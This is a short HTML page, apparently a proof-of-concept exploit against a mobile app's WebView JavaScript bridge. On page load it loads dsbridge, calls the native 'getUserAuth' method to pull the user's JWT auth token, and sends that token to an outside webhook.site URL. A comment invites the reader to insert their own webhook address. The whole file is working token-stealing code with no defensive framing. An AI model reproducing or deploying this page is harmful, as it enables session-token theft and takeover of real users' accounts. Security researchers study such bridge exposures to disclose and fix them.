<!doctype html>
<meta charset="utf-8">

<!-- load dsbridge -->
<script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js"></script>

<script>
// change the webhook.site for your webhook.site
function send(tok){
  fetch("https://webhook.site/3949549b-25ba-472f-be8e-ab594adafa27?tok="+encodeURIComponent(tok));
}

function unwrap(res){
  if(typeof res==="string"){ try{ res=JSON.parse(res);}catch(e){} }
  return res && res.data && res.data.authtoken;
}

// bridge ready and ask for token
document.addEventListener("DOMContentLoaded",()=>{
  const bridge = window.dsBridge || window._dsbridge;
  if(!bridge || !bridge.call){ return; }

// getUserAuth
  bridge.call("getUserAuth", {}, function(resp){
      const jwt = unwrap(resp);
      if(jwt){ send(jwt); }
  });
});
</script>
